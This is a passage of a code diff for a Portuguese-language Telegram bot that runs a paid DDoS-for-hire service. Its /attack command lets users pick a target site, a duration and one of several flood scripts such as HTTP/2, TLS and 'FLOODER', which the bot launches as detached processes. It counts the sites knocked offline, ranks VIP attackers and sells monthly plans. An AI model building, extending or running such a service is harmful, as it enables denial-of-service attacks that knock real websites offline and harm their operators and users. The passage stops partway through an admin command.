+        console.log('[' + ojiva.nome + '] Ataque ' + (i+1) + '/' + sim + ': node ' + args.join(' '));
+        const proc = spawn('node', args, { 
+            stdio: ['pipe', 'pipe', 'pipe'], detached: true,
+            env: { ...process.env, NODE_NO_WARNINGS: '1', NODE_OPTIONS: '--no-deprecation' }
+        });
+        attack.processes.push(proc);
+    }
+    
+    attack.timerTimeout = setTimeout(async () => {
+        if (attack.status === 'EXECUTANDO') {
+            attack.status = 'FINALIZADO';
+            attack.processes.forEach(p => { try { killProcessTree(p.pid); } catch(e) {} });
+            const u = authorizedUsers.get(userId);
+            if (u) u.currentAttacks = Math.max(0, u.currentAttacks - sim);
+            saveUsers();
+            const userTargets = attackedTargets.get(userId);
+            if (userTargets) userTargets.delete(target);
+            const userAttackSet = userAttacks.get(userId);
+            if (userAttackSet) userAttackSet.delete(attackId);
+            schedulePanelUpdate(attackId);
+            await sendLogToAdmin('✅ FINALIZADO\n👤 ' + firstName + '\n🎯 ' + target);
+        }
+    }, time * 1000);
+    
+    await criarPainel(ctx, attack);
+}
+
+
+bot.start(async (ctx) => {
+    const userId = ctx.from.id.toString();
+    const firstName = ctx.from.first_name || 'Operador';
+    
+    if (!authorizedUsers.has(userId)) {
+        authorizedUsers.set(userId, {
+            limit: 1,
+            currentAttacks: 0,
+            maxTime: 30,
+            maxRps: GLOBAL_MAX_RPS,
+            maxThreads: GLOBAL_MAX_THREADS,
+            simultaneousLimit: 1,
+            patente: 'PADRAO',
+            plano: 'GRATUITO',
+            vip: false,
+            total_attacks: 0,
+            total_quedas: 0,
+            first_name: firstName,
+            username: ctx.from.username || '',
+            created_at: Date.now()
+        });
+        saveUsers();
+    }
+    
+    checkDefaultConfigExpiration();
+    
+    if (vipUsers.has(userId)) {
+        if (!checkVipExpiration(userId)) {
+            await ctx.replyWithHTML(
+                '⚠️ <b>SEU VIP EXPIROU!</b>\n\n' +
+                'Seu período VIP terminou. Você foi rebaixado para o plano GRATUITO.\n' +
+                'Use /comprar para renovar.'
+            );
+        }
+    }
+    
+    if (!checkCaptcha(userId)) {
+        await showCaptcha(ctx, userId);
+        return;
+    }
+    
+    const user = authorizedUsers.get(userId);
+    if (!user.vip && !isAdmin(userId)) {
+        const defaultSim = defaultConfig.simultaneous || 1;
+        const defaultTime = defaultConfig.maxTime || 30;
+        user.simultaneousLimit = defaultSim;
+        user.maxTime = defaultTime;
+        user.limit = defaultSim;
+        saveUsers();
+    }
+    
+    await sendMainMenu(ctx, userId);
+});
+
+
+async function sendMainMenu(ctx, userId) {
+    const user = ctx.from;
+    const userData = authorizedUsers.get(userId) || { patente: 'PADRAO', plano: 'GRATUITO' };
+    const isAdminUser = isAdmin(userId);
+    const vipRemaining = getVipRemaining(userId);
+    const isVip = userData.vip || vipUsers.has(userId);
+    
+    const cpus = 12;
+    const totalMem = 60;
+    const uptime = Math.floor(os.uptime() / 3600);
+    const loadAvg = os.loadavg();
+    const nodeVersion = process.version;
+    const osType = os.type();
+    const osRelease = os.release();
+    
+    let message = 
+        '🖥️ <b>SISTEMA - C3 NUCLEAR</b>\n\n' +
+        '━━━━━━━━━━━━━━━━━━━━\n' +
+        `💻 <b>CPU:</b> ${cpus} vCPUs\n` +
+        `📊 <b>RAM:</b> ${totalMem} GB\n` +
+        `⬆️ <b>Uptime:</b> ${uptime}h\n` +
+        `📈 <b>Load:</b> ${loadAvg[0].toFixed(2)} / ${loadAvg[1].toFixed(2)} / ${loadAvg[2].toFixed(2)}\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `🐧 <b>SO:</b> ${osType} ${osRelease}\n` +
+        `📦 <b>Node.js:</b> ${nodeVersion}\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `🔧 <b>Status:</b> 🟢 ONLINE\n` +
+        `⚡ <b>Nodes:</b> ${globalStats.nodesAtivos}\n` +
+        `💥 <b>Total Quedas:</b> ${globalStats.totalQuedas}\n` +
+        `───────────────── ❖\n\n` +
+        `👤 Operador: ${escapeMarkdown(user.first_name)}\n` +
+        `💠 Patente: ${userData.patente || 'PADRAO'}\n` +
+        `🎯 Ataques: ${userData.total_attacks || 0}\n` +
+        `💀 Quedas: ${userData.total_quedas || 0}\n` +
+        (isVip && vipRemaining > 0 ? `⏳ VIP: ${formatVipRemaining(vipRemaining)}\n` : '');
+    
+    if (isAdminUser) {
+        message += '\n👑 <b>MENU ADMIN</b>\n';
+        message += '/adm - /listadmins - /removeadm\n';
+        message += '/gerakey - /listkeys - /revoke\n';
+        message += '/addvip - /removevip - /listvip\n';
+        message += '/clearhistory - /node - /addp - /tirap\n';
+        message += '/blek - /unblok\n';
+    }
+    
+    message += '\n📋 <b>COMANDOS</b>\n';
+    message += '/attack - Iniciar ofensiva\n';
+    message += '/report - Enviar feedback\n';
+    message += '/status - Meu status\n';
+    message += '/me - Meu perfil\n';
+    message += '/comprar - Adquirir VIP\n';
+    message += '/chk [alvo] - Verificar status\n';
+    message += '───────────────── ❖';
+    
+   
+    await ctx.replyWithHTML(message);
+}
+
+
+
+bot.action('menu_attack', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    if (!checkCaptcha(userId)) {
+        await showCaptcha(ctx, userId);
+        return ctx.answerCbQuery('🔐');
+    }
+    await ctx.replyWithHTML(
+        '🚀 <b>INICIAR OFENSIVA</b>\n\n' +
+        'Use: /attack [ALVO] [TEMPO] [SIM]\n\n' +
+        'Ex: /attack site.com 120 2'
+    );
+    await ctx.answerCbQuery('🎯');
+});
+
+bot.action('menu_status', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    const userData = authorizedUsers.get(userId);
+    if (!userData) return ctx.answerCbQuery('❌');
+    
+    const history = userAttackHistory.get(userId);
+    const totalAttacks = history ? history.total_attacks : 0;
+    const totalQuedas = history ? history.total_quedas : 0;
+    
+    let ativos = 0;
+    const userAttackSet = userAttacks.get(userId);
+    if (userAttackSet) {
+        for (const attackId of userAttackSet) {
+            const attack = activeAttacks.get(attackId);
+            if (attack && attack.status === 'EXECUTANDO') ativos++;
+        }
+    }
+    
+    const isVip = userData.vip || vipUsers.has(userId);
+    const vipRemaining = getVipRemaining(userId);
+    
+    await ctx.replyWithHTML(
+        `📊 <b>MEU STATUS</b>\n\n` +
+        `👤 ${escapeMarkdown(ctx.from.first_name)}\n` +
+        `💠 ${userData.patente || 'FREE'}\n` +
+        `⭐ VIP: ${isVip ? '✅' : '❌'}\n` +
+        (isVip && vipRemaining > 0 ? `⏳ ${formatVipRemaining(vipRemaining)}\n` : '') +
+        `⚔️ Ataques: ${totalAttacks}\n` +
+        `💀 Quedas: ${totalQuedas}\n` +
+        `🔥 Ativos: ${ativos}\n` +
+        `🔄 Max: ${userData.simultaneousLimit || 1}\n` +
+        `⏱️ Max: ${userData.maxTime || 30}s`
+    );
+    await ctx.answerCbQuery('📊');
+});
+
+bot.action('menu_rank', async (ctx) => {
+    await bot.commands.find(c => c.command === 'rank').fn(ctx);
+    await ctx.answerCbQuery('🏆');
+});
+
+bot.action('menu_me', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    const userData = authorizedUsers.get(userId);
+    const history = userAttackHistory.get(userId);
+    const isVip = userData?.vip || vipUsers.has(userId);
+    const vipRemaining = getVipRemaining(userId);
+    
+    await ctx.replyWithHTML(
+        `👤 <b>PERFIL</b>\n\n` +
+        `🆔 ${userId}\n` +
+        `📛 ${escapeMarkdown(ctx.from.first_name)}\n` +
+        `@ ${ctx.from.username || 'N/A'}\n` +
+        `💠 ${userData?.patente || 'FREE'}\n` +
+        `⭐ VIP: ${isVip ? '✅' : '❌'}\n` +
+        (isVip && vipRemaining > 0 ? `⏳ ${formatVipRemaining(vipRemaining)}\n` : '') +
+        `⚔️ ${history?.total_attacks || 0}\n` +
+        `💀 ${history?.total_quedas || 0}`
+    );
+    await ctx.answerCbQuery('👤');
+});
+
+bot.action('menu_comprar', async (ctx) => {
+    await ctx.replyWithHTML(
+        '💳 <b>ADQUIRIR VIP</b>\n\n' +
+        'ELITE MENSAL - R$ 50,00\n' +
+        'MASTER MENSAL - R$ 100,00\n' +
+        'ULTIMATE MENSAL - R$ 200,00\n\n' +
+        '📞 Contato: @gaspazinha'
+    );
+    await ctx.answerCbQuery('💳');
+});
+
+bot.action('menu_sistema', async (ctx) => {
+    await bot.commands.find(c => c.command === 'sistema').fn(ctx);
+    await ctx.answerCbQuery('🖥️');
+});
+
+bot.action('menu_gerakey', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    if (!isAdmin(userId)) return ctx.answerCbQuery('🚫');
+    await ctx.replyWithHTML(
+        '🔑 <b>GERAR KEY</b>\n\n' +
+        '/gerakey [SIM] [TEMPO] [DUR]\n' +
+        'Ex: /gerakey 1 120 1d'
+    );
+    await ctx.answerCbQuery('🔑');
+});
+
+bot.action('menu_addvip', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    if (!isAdmin(userId)) return ctx.answerCbQuery('🚫');
+    await ctx.replyWithHTML(
+        '👑 <b>ADD VIP</b>\n\n' +
+        '/addvip [ID] [SIM] [TEMPO] [DUR]\n' +
+        'Ex: /addvip 123456789 5 300 1d'
+    );
+    await ctx.answerCbQuery('👑');
+});
+
+bot.action('menu_node', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    if (!isAdmin(userId)) return ctx.answerCbQuery('🚫');
+    await ctx.replyWithHTML(
+        '📢 <b>AVISO GERAL</b>\n\n' +
+        '/node [MENSAGEM]\n' +
+        'Ex: /node Manutenção às 22h'
+    );
+    await ctx.answerCbQuery('📢');
+});
+
+
+bot.command('attack', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    const now = Date.now();
+    
+    checkDefaultConfigExpiration();
+    
+    if (!checkCaptcha(userId)) {
+        await showCaptcha(ctx, userId);
+        return;
+    }
+    
+    const user = authorizedUsers.get(userId);
+    if (!user) return ctx.reply('❌ ACESSO NEGADO');
+    
+    if (!user.vip && !isAdmin(userId)) {
+        const defaultSim = defaultConfig.simultaneous || 1;
+        const defaultTime = defaultConfig.maxTime || 30;
+        user.simultaneousLimit = defaultSim;
+        user.maxTime = defaultTime;
+        user.limit = defaultSim;
+        saveUsers();
+    }
+    
+    if (!user.vip) {
+        const cooldownUntil = userCooldown.get(userId);
+        if (cooldownUntil && now < cooldownUntil) {
+            return ctx.reply('⏳ AGUARDE ' + Math.ceil((cooldownUntil - now) / 1000) + 's');
+        }
+    }
+    
+    const args = ctx.message.text.split(' ');
+    if (args.length < 4) {
+        return ctx.reply('/attack [ALVO] [TEMPO] [SIM]\nEx: /attack site.com 120 2');
+    }
+    
+    let target = args[1];
+    const time = parseInt(args[2]);
+    const sim = parseInt(args[3]);
+    
+    target = normalizeUrl(target);
+    
+    const host = extractHost(target);
+    if (blockedTargets.has(host)) return ctx.reply('🚫 ALVO BLOQUEADO PELA FORÇA SUPREMA');
+    
+    if (time > user.maxTime) return ctx.reply('⏱️ MAX: ' + user.maxTime + 's');
+    if (sim > user.simultaneousLimit) return ctx.reply('🔄 MAX: ' + user.simultaneousLimit);
+    
+    const ip = await resolveIP(target);
+    attackSessions.set(userId, { target, time, sim, ip, firstName: ctx.from.first_name, username: ctx.from.username || '' });
+    
+    const menu = Markup.inlineKeyboard([
+        [Markup.button.callback('⚡KILL', `ojiva_GPZ_KILL_${userId}`), Markup.button.callback('🎯AR', `ojiva_GPZ_AR_${userId}`)],
+        [Markup.button.callback('🌀WX', `ojiva_GPZ_WX_${userId}`), Markup.button.callback('🔒TLS', `ojiva_GPZ_TLS_${userId}`)],
+        [Markup.button.callback('🔐TLS1', `ojiva_GPZ_TLS1_${userId}`), Markup.button.callback('☢️HTTP', `ojiva_GPZ_HTTP_${userId}`)],
+        [Markup.button.callback('🌊FLOOD', `ojiva_GPZ_FLOODER_${userId}`), Markup.button.callback('🔥C3', `ojiva_GPZ_C3_${userId}`)],
+        [Markup.button.callback('💀H2', `ojiva_GPZ_H2_${userId}`), Markup.button.callback('🚀H2M', `ojiva_GPZ_H2MONARCH_${userId}`)],
+        [Markup.button.callback('❌ CANCELAR', `cancel_${userId}`)]
+    ]);
+    
+    await ctx.reply(
+        '🎯 <b>MIRA TRAVADA</b>\n\n' +
+        '🌐 ' + target + '\n' +
+        '📡 ' + ip + '\n' +
+        '⏱️ ' + time + 's\n' +
+        '🔄 ' + sim + '\n' +
+        '⚡ RPS: ' + FIXED_RPS + ' | THREADS: ' + FIXED_THREADS + '\n\n' +
+        'Selecione a ojiva:',
+        { parse_mode: 'HTML', ...menu }
+    );
+});
+
+
+bot.action(/ojiva_(.+)_(.+)/, async (ctx) => {
+    const ojivaKey = ctx.match[1];
+    const userId = ctx.match[2];
+    if (ctx.from.id.toString() !== userId) return;
+    
+    const session = attackSessions.get(userId);
+    if (!session) {
+        await ctx.editMessageText('⏳ SESSAO EXPIRADA');
+        return;
+    }
+    
+    const ojivaMap = {
+        'GPZ_KILL': { nome: 'KILL', script: 'gpzkill.js' },
+        'GPZ_AR': { nome: 'GPZ-AR', script: 'ar.js' },
+        'GPZ_WX': { nome: 'WX', script: 'gpzwx.js' },
+        'GPZ_TLS': { nome: 'TLS', script: 'tls.js' },
+        'GPZ_TLS1': { nome: 'TLS1', script: 'tls1.js' },
+        'GPZ_HTTP': { nome: 'HTTP', script: 'http.js' },
+        'GPZ_FLOODER': { nome: 'FLOODER', script: 'flooder.js' },
+        'GPZ_C3': { nome: 'C3', script: 'c3.js' },
+        'GPZ_H2': { nome: 'H2', script: 'c4.js' },
+        'GPZ_H2MONARCH': { nome: 'H2-MONARCH', script: 'h2monarch.js' }
+    };
+    
+    const ojivaConfig = ojivaMap[ojivaKey];
+    if (!ojivaConfig) return;
+    
+    await ctx.deleteMessage().catch(() => {});
+    await iniciarAtaques(ctx, userId, session, ojivaConfig);
+    attackSessions.delete(userId);
+});
+
+bot.action(/cancel_(.+)/, async (ctx) => {
+    const userId = ctx.match[1];
+    attackSessions.delete(userId);
+    await ctx.editMessageText('❌ OPERACAO CANCELADA');
+});
+
+bot.action(/stop_attack_(.+)/, async (ctx) => {
+    const attackId = parseInt(ctx.match[1]);
+    const attack = activeAttacks.get(attackId);
+    if (!attack) {
+        await ctx.editMessageText('❌ ATAQUE NAO ENCONTRADO');
+        return;
+    }
+    if (ctx.from.id.toString() !== attack.userId && !isAdmin(ctx.from.id.toString())) return;
+    if (stopSpecificAttack(attackId)) {
+        await ctx.editMessageText('🛑 ATAQUE ABORTADO: ' + attack.target);
+        panelMessages.delete(attackId);
+    }
+});
+
+
+bot.command('chk', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!checkCaptcha(userId)) {
+        await showCaptcha(ctx, userId);
+        return;
+    }
+    
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply('📡 /chk [ALVO]\nEx: /chk site.com');
+    }
+    
+    const target = args[1];
+    const url = target.startsWith('http') ? target : `https://${target}`;
+    
+    await ctx.reply('⏳ Verificando ' + url + '...');
+    
+    const result = await checkTargetStatus(target);
+    
+    let msg = '📡 <b>STATUS DO ALVO</b>\n\n';
+    msg += '🎯 <b>Alvo:</b> ' + url + '\n';
+    msg += '📊 <b>Status:</b> ' + result.status + '\n';
+    if (result.error) {
+        msg += '❌ <b>Erro:</b> ' + result.error + '\n';
+    }
+    msg += '🔢 <b>Código HTTP:</b> ' + result.httpCode + '\n';
+    msg += '━━━━━━━━━━━━━━━━━━━━\n';
+    
+    if (result.online) {
+        msg += '✅ <b>Alvo:</b> ONLINE';
+    } else {
+        msg += '❌ <b>Alvo:</b> OFFLINE';
+    }
+    
+    await ctx.replyWithHTML(msg);
+});
+
+
+bot.command('sistema', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!checkCaptcha(userId)) {
+        await showCaptcha(ctx, userId);
+        return;
+    }
+    
+    const cpus = 12;
+    const totalMem = 60;
+    const uptime = Math.floor(os.uptime() / 3600);
+    const loadAvg = os.loadavg();
+    const nodeVersion = process.version;
+    const osType = os.type();
+    const osRelease = os.release();
+    
+    await ctx.replyWithHTML(
+        '🖥️ <b>SISTEMA - C3 NUCLEAR</b>\n\n' +
+        '━━━━━━━━━━━━━━━━━━━━\n' +
+        `💻 <b>CPU:</b> ${cpus} vCPUs\n` +
+        `📊 <b>RAM:</b> ${totalMem} GB\n` +
+        `⬆️ <b>Uptime:</b> ${uptime}h\n` +
+        `📈 <b>Load:</b> ${loadAvg[0].toFixed(2)} / ${loadAvg[1].toFixed(2)} / ${loadAvg[2].toFixed(2)}\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `🐧 <b>SO:</b> ${osType} ${osRelease}\n` +
+        `📦 <b>Node.js:</b> ${nodeVersion}\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `🔧 <b>Status:</b> 🟢 ONLINE\n` +
+        `⚡ <b>Nodes:</b> ${globalStats.nodesAtivos}\n` +
+        `💥 <b>Total Quedas:</b> ${globalStats.totalQuedas}\n` +
+        `───────────────── ❖`
+    );
+});
+
+
+bot.command('report', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    const msg = ctx.message.text.replace('/report', '').trim();
+    
+    if (!msg) {
+        return ctx.reply('📢 /report [MENSAGEM]\nEx: /report Problema com minha VPS');
+    }
+    
+    const user = ctx.from;
+    const userName = user.first_name || 'Desconhecido';
+    const userUsername = user.username ? '@' + user.username : 'Sem @';
+    
+    let sent = 0;
+    for (const adminId of adminList) {
+        try {
+            await bot.telegram.sendMessage(
+                adminId,
+                `📢 <b>NOVO REPORT</b>\n\n` +
+                `👤 ${escapeMarkdown(userName)} (${userUsername})\n` +
+                `🆔 ${userId}\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `${escapeMarkdown(msg)}`,
+                { parse_mode: 'HTML' }
+            );
+            sent++;
+        } catch(e) {}
+    }
+    
+    await ctx.replyWithHTML(
+        '✅ <b>REPORT ENVIADO!</b>\n\n' +
+        '📌 O ADM responderá em breve.'
+    );
+});
+
+
+bot.command('rank', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!checkCaptcha(userId)) {
+        await showCaptcha(ctx, userId);
+        return;
+    }
+    
+    const rankingData = [];
+    
+    userAttackHistory.forEach((history, uid) => {
+        const user = authorizedUsers.get(uid);
+        if (user && user.vip) {
+            rankingData.push({
+                id: uid,
+                name: history.first_name || 'VIP-' + uid.substring(0, 6),
+                total_attacks: history.total_attacks || 0,
+                total_quedas: history.total_quedas || 0,
+                last_attack: history.last_attack || 0,
+                patente: user.patente || 'VIP',
+                simultaneousLimit: user.simultaneousLimit || 0,
+                maxTime: user.maxTime || 0
+            });
+        }
+    });
+    
+    authorizedUsers.forEach((user, uid) => {
+        if (user.vip && !rankingData.find(r => r.id === uid)) {
+            rankingData.push({
+                id: uid,
+                name: user.first_name || 'VIP-' + uid.substring(0, 6),
+                total_attacks: user.total_attacks || 0,
+                total_quedas: user.total_quedas || 0,
+                last_attack: 0,
+                patente: user.patente || 'VIP',
+                simultaneousLimit: user.simultaneousLimit || 0,
+                maxTime: user.maxTime || 0
+            });
+        }
+    });
+    
+    rankingData.sort((a, b) => b.total_attacks - a.total_attacks);
+    
+    if (rankingData.length === 0) {
+        return ctx.reply('🏆 RANKING VIP\n\n📊 Nenhum operador VIP registrou ataques ainda.');
+    }
+    
+    let msg = '🏆 <b>RANKING VIP</b>\n\n';
+    
+    const medals = ['🥇', '🥈', '🥉', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟'];
+    
+    rankingData.slice(0, 10).forEach((entry, index) => {
+        const medal = medals[index] || '📌';
+        const lastAttackTime = entry.last_attack > 0 
+            ? formatTimeAgo(entry.last_attack)
+            : 'Nenhum ataque';
+        
+        msg += medal + ' ' + entry.name + '\n';
+        msg += '   ⚔️ ' + entry.total_attacks + ' | 💀 ' + entry.total_quedas + '\n';
+        msg += '   🔄 ' + entry.simultaneousLimit + ' | ⏱️ ' + entry.maxTime + 's\n';
+        msg += '   🕐 ' + lastAttackTime + '\n\n';
+    });
+    
+    const totalAttacks = rankingData.reduce((sum, r) => sum + r.total_attacks, 0);
+    const totalQuedas = rankingData.reduce((sum, r) => sum + r.total_quedas, 0);
+    
+    msg += '━━━━━━━━━━━━━━━━━━━━\n';
+    msg += '👥 ' + rankingData.length + ' VIPs\n';
+    msg += '⚔️ ' + totalAttacks + ' ataques\n';
+    msg += '💀 ' + totalQuedas + ' quedas';
+    
+    await ctx.replyWithHTML(msg);
+});
+
+
+bot.command('status', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!checkCaptcha(userId)) {
+        await showCaptcha(ctx, userId);
+        return;
+    }
+    
+    const user = authorizedUsers.get(userId);
+    if (!user) return ctx.reply('❌ ACESSO NEGADO');
+    
+    const history = userAttackHistory.get(userId);
+    const totalAttacks = history ? history.total_attacks : 0;
+    const totalQuedas = history ? history.total_quedas : 0;
+    
+    let ativos = 0;
+    const userAttackSet = userAttacks.get(userId);
+    if (userAttackSet) {
+        for (const attackId of userAttackSet) {
+            const attack = activeAttacks.get(attackId);
+            if (attack && attack.status === 'EXECUTANDO') ativos++;
+        }
+    }
+    
+    const isVip = user.vip || vipUsers.has(userId);
+    const vipRemaining = getVipRemaining(userId);
+    
+    await ctx.replyWithHTML(
+        `📊 <b>MEU STATUS</b>\n\n` +
+        `👤 ${escapeMarkdown(ctx.from.first_name)}\n` +
+        `💠 ${user.patente || 'FREE'}\n` +
+        `⭐ VIP: ${isVip ? '✅' : '❌'}\n` +
+        (isVip && vipRemaining > 0 ? `⏳ ${formatVipRemaining(vipRemaining)}\n` : '') +
+        `⚔️ Ataques: ${totalAttacks}\n` +
+        `💀 Quedas: ${totalQuedas}\n` +
+        `🔥 Ativos: ${ativos}\n` +
+        `🔄 Max: ${user.simultaneousLimit || 1}\n` +
+        `⏱️ Max: ${user.maxTime || 30}s`
+    );
+});
+
+
+bot.command('me', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!checkCaptcha(userId)) {
+        await showCaptcha(ctx, userId);
+        return;
+    }
+    
+    const user = authorizedUsers.get(userId);
+    const history = userAttackHistory.get(userId);
+    const isVip = user?.vip || vipUsers.has(userId);
+    const vipRemaining = getVipRemaining(userId);
+    
+    await ctx.replyWithHTML(
+        `👤 <b>PERFIL</b>\n\n` +
+        `🆔 ${userId}\n` +
+        `📛 ${escapeMarkdown(ctx.from.first_name)}\n` +
+        `@ ${ctx.from.username || 'N/A'}\n` +
+        `💠 ${user?.patente || 'FREE'}\n` +
+        `⭐ VIP: ${isVip ? '✅' : '❌'}\n` +
+        (isVip && vipRemaining > 0 ? `⏳ ${formatVipRemaining(vipRemaining)}\n` : '') +
+        `⚔️ ${history?.total_attacks || 0}\n` +
+        `💀 ${history?.total_quedas || 0}`
+    );
+});
+
+
+bot.command('comprar', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!checkCaptcha(userId)) {
+        await showCaptcha(ctx, userId);
+        return;
+    }
+    
+    await ctx.replyWithHTML(
+        '💳 <b>ADQUIRIR VIP</b>\n\n' +
+        'ELITE MENSAL - R$ 50,00\n' +
+        'MASTER MENSAL - R$ 100,00\n' +
+        'ULTIMATE MENSAL - R$ 200,00\n\n' +
+        '📞 Contato: @gaspazinha'
+    );
+});
+
+
+bot.command('stop', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!checkCaptcha(userId)) {
+        await showCaptcha(ctx, userId);
+        return;
+    }
+    
+    const stopped = stopAllUserAttacks(userId);
+    ctx.reply('🛑 ' + stopped + ' ATAQUE(S) ABORTADO(S)');
+});
+
+
+bot.command('blek', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!isAdmin(userId)) {
+        return ctx.reply('🚫 ACESSO BLOQUEADO');
+    }
+    
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply('/blek [ALVO]\nEx: /blek site.com');
+    }
+    
+    let target = args[1];
+    target = target.trim().toLowerCase();
+    target = target.replace(/^https?:\/\//, '');
+    if (target.includes('/')) target = target.split('/')[0];
+    
+    if (blockedTargets.has(target)) {
+        return ctx.reply('⚠️ ALVO JÁ ESTÁ BLOQUEADO: ' + target);
+    }
+    
+    blockedTargets.add(target);
+    saveBlocked();
+    
+    await ctx.replyWithHTML(
+        '🔒 <b>ALVO BLOQUEADO</b>\n\n' +
+        `🎯 ${target}\n\n` +
+        '🛡️ Ninguém poderá atacar este alvo!'
+    );
+    
+   
+    let stopped = 0;
+    for (const [attackId, attack] of activeAttacks) {
+        const attackTarget = extractHost(attack.target);
+        if (attackTarget === target && attack.status === 'EXECUTANDO') {
+            if (stopSpecificAttack(attackId)) stopped++;
+        }
+    }
+    
+    if (stopped > 0) {
+        await ctx.reply('🛑 ' + stopped + ' ataque(s) ativo(s) contra ' + target + ' foram parados.');
+    }
+    
+    await sendLogToAdmin('🔒 ALVO BLOQUEADO: ' + target + ' por ' + ctx.from.first_name);
+});
+
+
+bot.command('unblok', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!isAdmin(userId)) {
+        return ctx.reply('🚫 ACESSO BLOQUEADO');
+    }
+    
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply('/unblok [ALVO]\nEx: /unblok site.com');
+    }
+    
+    let target = args[1];
+    target = target.trim().toLowerCase();
+    target = target.replace(/^https?:\/\//, '');
+    if (target.includes('/')) target = target.split('/')[0];
+    
+    if (!blockedTargets.has(target)) {
+        return ctx.reply('⚠️ ALVO NÃO ESTÁ BLOQUEADO: ' + target);
+    }
+    
+    blockedTargets.delete(target);
+    saveBlocked();
+    
+    await ctx.replyWithHTML(
+        '🔓 <b>ALVO DESBLOQUEADO</b>\n\n' +
+        `🎯 ${target}\n\n` +
+        '⚡ O alvo pode ser atacado novamente!'
+    );
+    
+    await sendLogToAdmin('🔓 ALVO DESBLOQUEADO: ' + target + ' por ' + ctx.from.first_name);
+});
+
+
+bot.command('addp', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!isAdmin(userId)) {
+        return ctx.reply('🚫 ACESSO BLOQUEADO');
+    }
+    
+    const args = ctx.message.text.split(' ');
+    if (args.length < 4) {
+        return ctx.reply(
+            '📋 /addp [SIM] [TEMPO] [DUR]\n' +
+            'Ex: /addp 1 30 1h\n' +
+            'Formatos: d, h, m'
+        );
+    }
+    
+    const sim = parseInt(args[1]);
+    const tmax = parseInt(args[2]);
+    const duracaoStr = args[3].toLowerCase();
+    
+    if (isNaN(sim) || sim < 1) return ctx.reply('❌ SIM INVALIDO');
+    if (isNaN(tmax) || tmax < 5) return ctx.reply('❌ TEMPO INVALIDO');
+    
+    let durationSeconds = 0;
+    let durationText = '';
+    
+    if (duracaoStr.endsWith('d')) {
+        const val = parseInt(duracaoStr);
+        if (isNaN(val) || val < 1) return ctx.reply('❌ DIAS INVALIDOS');
+        durationSeconds = val * 86400;
+        durationText = val + ' dia(s)';
+    } else if (duracaoStr.endsWith('h')) {
+        const val = parseInt(duracaoStr);
+        if (isNaN(val) || val < 1) return ctx.reply('❌ HORAS INVALIDAS');
+        durationSeconds = val * 3600;
+        durationText = val + ' hora(s)';
+    } else if (duracaoStr.endsWith('m')) {
+        const val = parseInt(duracaoStr);
+        if (isNaN(val) || val < 1) return ctx.reply('❌ MINUTOS INVALIDOS');
+        durationSeconds = val * 60;
+        durationText = val + ' minuto(s)';
+    } else {
+        return ctx.reply('❌ FORMATO INVALIDO! Use: 1d, 1h ou 1m');
+    }
+    
+    defaultConfig.simultaneous = sim;
+    defaultConfig.maxTime = tmax;
+    defaultConfig.expires_at = Date.now() + (durationSeconds * 1000);
+    saveDefaultConfig();
+    
+    let count = 0;
+    let vipCount = 0;
+    let admCount = 0;
+    let notified = 0;
+    
+    for (const [id, user] of authorizedUsers) {
+        if (isAdmin(id)) {
+            admCount++;
+            continue;
+        }
+        
+        if (user.vip || vipUsers.has(id)) {
+            vipCount++;
+            continue;
+        }
+        
+        user.simultaneousLimit = sim;
+        user.maxTime = tmax;
+        user.limit = sim;
+        user.patente = 'PADRAO';
+        user.plano = 'GRATUITO';
+        count++;
+        
+        try {
+            await bot.telegram.sendMessage(
+                id,
+                `🎉 <b>BOA BOA FORÇA MAIOR!</b>\n\n` +
+                `😎 Tá de bom humor! Toma aí ${sim} simultâneo(s) e ${tmax} segundos por ataque!\n\n` +
+                `⚡ ${sim}x | ⏱️ ${tmax}s\n` +
+                `⏳ ${durationText}\n\n` +
+                `💪 Use /attack!`,
+                { parse_mode: 'HTML' }
+            );
+            notified++;
+            await new Promise(r => setTimeout(r, 50));
+        } catch(e) {}
+    }
+    
+    saveUsers();
+    
+    await ctx.replyWithHTML(
+        '✅ <b>PADRÃO DEFINIDO!</b>\n\n' +
+        `🔄 ${sim}x | ⏱️ ${tmax}s\n` +
+        `⏳ ${durationText}\n\n` +
+        `👤 ${count} usuários\n` +
+        `📨 ${notified} notificados\n` +
+        `⭐ ${vipCount} VIPs\n` +
+        `👑 ${admCount} ADMs`
+    );
+    
+    await sendLogToAdmin(
+        `📋 PADRÃO DEFINIDO\n` +
+        `🔄 ${sim}x | ⏱️ ${tmax}s\n` +
+        `⏳ ${durationText}\n` +
+        `👤 ${count} usuários`
+    );
+});
+
+
+bot.command('tirap', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!isAdmin(userId)) {
+        return ctx.reply('🚫 ACESSO BLOQUEADO');
+    }
+    
+    defaultConfig = { simultaneous: 1, maxTime: 30, expires_at: 0 };
+    saveDefaultConfig();
+    
+    let count = 0;
+    let vipCount = 0;
+    let admCount = 0;
+    
+    for (const [id, user] of authorizedUsers) {
+        if (isAdmin(id)) {
